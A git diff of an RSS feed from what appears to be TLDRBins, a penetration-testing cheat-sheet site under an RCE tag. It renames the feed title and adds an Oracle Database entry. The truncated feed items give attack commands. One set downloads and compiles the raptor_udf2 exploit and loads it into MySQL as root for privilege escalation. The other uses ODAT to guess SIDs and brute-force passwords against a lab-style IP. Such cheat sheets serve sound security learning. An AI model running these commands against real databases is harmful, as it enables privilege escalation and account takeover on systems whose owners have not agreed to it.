@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>RCE on TLDRBins</title>
+    <title>Rce on TLDRBins</title>
     <link>https://tldrbins.github.io/@rce/</link>
-    <description>Recent content in RCE on TLDRBins</description>
+    <description>Recent content in Rce on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@rce/index.xml" rel="self" type="application/rss+xml" />
@@ -20,6 +20,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
       <description>Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
+    </item>
+    <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
     </item>
   </channel>
 </rss>
